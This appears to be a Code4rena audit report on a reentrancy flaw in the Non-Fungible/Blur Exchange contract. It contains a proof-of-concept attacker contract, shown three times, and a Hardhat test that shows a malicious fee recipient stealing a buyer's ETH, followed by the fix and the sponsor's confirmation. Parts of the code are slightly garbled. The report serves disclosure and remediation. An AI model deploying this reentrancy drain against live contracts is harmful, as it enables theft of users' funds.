ETH:\n1. Reentrancy is possible by feeRecipient as long as _execute is not called (_execute has a reentrancyGuard)\n2. bulkExecute can be called with an empty parameter. This allows the caller to not enter _execute and call _returnDust\n3. _returnDust sends the entire balance of the contract to the caller.\n\n(Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)\n\nThere are two logical scenarios where the heist could originate from:\n1. Malicious seller: The seller can set the fee recipient to a malicious contract.\n2. Malicious fee recipient: fee recipient can steal the funds without the help of the seller. \n\nConsider the scenario (#1) where feeRecipient rate 10% of token price 1 ETH:\n1. Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice's (seller) sell order (lets assume first in line).\n2. Bob calls bulkExecute with 4 ETH. 1 ETH for every order. \n3. Alice's sell order gets executed. Fee  0.1 ETH is sent to feeRecipient (controlled by Alice).\n4. feeRecipient *reenters* bulkExecute with *empty* array as parameter and 1 WEI of data\n5. _returnDust returns the balance of the contract to feeRecipient 3.9 ETH.\n6. feeRecipient sends 3.1 ETH to seller (or any other beneficiary)\n7. feeRecipient call selfdestruct opcode that transfers 0.9 ETH to Exchange contract. This is in order to keep _execute from reverting when paying the seller.\n8. _execute pays seller  0.9 ETH \n9. Sellers balance is 4 ETH. \n10. The rest of the _execute calls by bulkExecute will get reverted because buyer cannot pay as his funds were stolen.\n11. Buyers 3 ETH funds stolen\n\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502\n\u2502   Buyer   \u2502            \u2502 Exchange \u2502         \u2502 Fee Recipient \u2502    \u2502  Seller   \u2502\n\u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502 bulkExecute(4 orders) \u2502                       \u2502                  \u2502\n      \u2502         4 ETH         \u2502                       \u2502                  \u2502\n      \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                       \u2502                  \u2502\n      \u2502                       \u2502_execute sends 0.1 ETH \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502 bulkExecute(0 orders) \u2502                  \u2502\n      \u2502                       \u2502         1 WEI         \u2502                  \u2502\n      \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502    _retrunDust sends  \u2502                  \u2502\n      \u2502                       \u2502         3.9 ETH       \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502  Send 3.1 ETH    \u2502\n      \u2502                       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502\n      \u2502                       \u2502 Self destruct send    \u2502                  \u2502\n      \u2502                       \u2502         0.9 ETH       \u2502                  \u2502\n      \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502_execute sends 0.9 ETH \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 _execute revert\u2502                  \u2502\n      \u2502                       \u2502      \u2502     3 times    \u2502                  \u2502\n  \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510                   \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518                \u2502              \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510\n  \u25023 ETH  \u2502                   \u2502                       \u2502              \u25024 ETH  \u2502\n  \u2502Stolen \u2502                                                          \u2502Balance\u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\nHere is a possible implementation of the fee recipient contract:\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance (_price feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n\n\nImportant to know:\nThe exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:\n\n\npragma solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n    \n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n\n\nIn the POC we talk mostly about bulkExecute but execute of a single execution can steal the buyers excessive ETH.\n\n\nBuyers can call execute or bulkExecute to start an execution of orders.<br\nBoth functions have a setupExecution modifier that stores the amount of ETH the caller has sent for the transactions:\n\nbulkExecute in Exchange.sol:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\n\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n\n\nsetupExecution:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40\n\n    modifier setupExecution() {\n        remainingETH = msg.value;\n        isInternal = true;\n        _;\n        remainingETH = 0;\n        isInternal = false;\n    }\n\n\n_execute will be called to handle the buy and sell order.\n* The function has a reentracnyGuard. \n* The function will check that the orders are signed correctly and that both orders match.\n* If everything is OK, _executeFundsTransfer will be called to transfer the buyers funds to the seller and fee recipient\n\n_executeFundsTransfer:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565\n\n    function _executeFundsTransfer(\n        address seller,\n        address buyer,\n        address paymentToken,\n        Fee[] calldata fees,\n        uint256 price\n    ) internal {\n        if (msg.sender == buyer && paymentToken == address(0)) {\n            require(remainingETH = price);\n            remainingETH -= price;\n        }\n\n        /* Take fee. */\n        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);\n\n        /* Transfer remainder to seller. */\n        _transferTo(paymentToken, buyer, seller, receiveAmount);\n    }\n\n\nFees are calculated based on the rate set by the seller and send to the fee recipient in _transferFees. \n\nWhen the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract. \nThis can be done through bulkExecution.\n\nbulkExecution can be called with an empty array. If so, no _execute function will be called and therefore no reentrancyGuard will trigger.\nAt the end of bulkExecution, _returnDust function is called to return excessive funds.\n\nbulkExecute: \nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\n\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n        /*\n        REFERENCE\n        uint256 executionsLength = executions.length;\n        for (uint8 i=0; i < executionsLength; i++) {\n            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);\n            (bool success,) = address(this).delegatecall(data);\n        }\n        _returnDust(remainingETH);\n        */\n        uint256 executionsLength = executions.length;\n        for (uint8 i = 0; i < executionsLength; i++) {\n\n\n_returnDust:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212\n\n    function _returnDust() private {\n        uint256 _remainingETH = remainingETH;\n        assembly {\n            if gt(_remainingETH, 0) {\n                let callStatus := call(\n                    gas(),\n                    caller(),\n                    selfbalance(),\n                    0,\n                    0,\n                    0,\n                    0\n                )\n            }\n        }\n    }\n\n\nAfter the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the _executeFundsTransfer to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the selfdestruct opcode\n\nAfter that, the _execute function will continue and exit normally.<br\nbulkExecute will continue to the next order and call _execute which will revert.<br\nBecause bulkExecute delegatecalls _execute and continues even after revert, the function bulkExecute will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.\n\n\nAdd the following test to execution.test.ts:\n\ndescribe.only('hack', async () = {\n      let executions: any[];\n      let value: BigNumber;\n      beforeEach(async () = {\n        await updateBalances();\n        const _executions = ];\n        value = BigNumber.from(0);\n        // deploy MockFeeReceipient\n        let contractFactory = await (hre as any).ethers.getContractFactory(\n          \"MockFeeReceipient\",\n          {},\n        );\n        let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);\n        await contractMockFeeReceipient.deployed();\n        //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut\n        tokenId += 1;\n        await mockERC721.mint(alice.address, tokenId);\n        sell = generateOrder(alice, {\n          side: Side.Sell,\n          tokenId,\n          paymentToken: ZERO_ADDRESS,\n          fees:  \n            {\n              rate: 1000,\n              recipient: contractMockFeeReceipient.address,\n            }\n          ],\n        });\n        buy = generateOrder(bob, { \n          side: Side.Buy,\n          tokenId,\n          paymentToken: ZERO_ADDRESS});\n        _executions.push({\n            sell: await sell.packNoOracleSig(),\n            buy: await buy.packNoSigs(),\n        });\n        // create 3 more executions\n        tokenId += 1;\n        for (let i = tokenId; i < tokenId + 3; i++) {\n          await mockERC721.mint(thirdParty.address, i);\n          const _sell = generateOrder(thirdParty, {\n            side: Side.Sell,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          const _buy = generateOrder(bob, {\n            side: Side.Buy,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          _executions.push({\n            sell: await _sell.packNoOracleSig(),\n            buy: await _buy.packNoSigs(),\n          });\n        }\n        executions = _executions;\n      });\n      it(\"steal funds\", async () = {\n        let aliceBalanceBefore = await alice.getBalance();\n        //price = 4 ETH\n        value = price.mul(4);\n        //call bulkExecute\n        tx = await waitForTx(\n          exchange.connect(bob).bulkExecute(executions, { value  }));\n        let aliceBalanceAfter = await alice.getBalance();\n        let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);\n        //check that alice received all 4 ETH\n        expect(aliceEarned).to.equal(value);\n      });\n    });\n\n\nAdd the following contract to mocks folder:<br\nMockFeeRecipient.sol:\n\npragma solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance (_price feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n\n\n\nExecute yarn test to see that test pass (Alice stole all 4 ETH)\n\nVS code, hardhat\n\n",
                "Repair": "1. Put a reentrancyGuard on execute and bulkExecute functions\n2. _refundDust return only _remainingETH\n3. revert in bulkExecute if parameter array is empty.\n\nnonfungible47 (Blur) confirmed and commented(https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96#issuecomment-1341617796):\n  Both mitigation steps 2 and 3 were added. We cannot add reentrancyGuard to the execute and bulkExecute functions as it will break the call to _execute. So, a separate guard was added in setupExecution that would require isInternal = false, preventing reentrant calls.\n\n\n\n*\n \n\n"
            }
        ]
    }
]